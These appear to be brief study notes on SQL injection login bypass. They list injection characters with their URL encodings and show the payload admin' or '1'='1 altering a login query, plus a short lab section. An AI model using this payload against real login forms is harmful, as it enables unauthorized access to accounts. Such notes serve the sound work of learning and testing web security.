# Subverting Query Logic

SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';

Payload	URL Encoded
'	%27
"	%22
#	%23
;	%3B
)	%29

SELECT * FROM logins WHERE username=''' AND password = 'something';

admin' or '1'='1

SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';



## LAB

'	%27
"	%22
#	%23
;	%3B
)	%29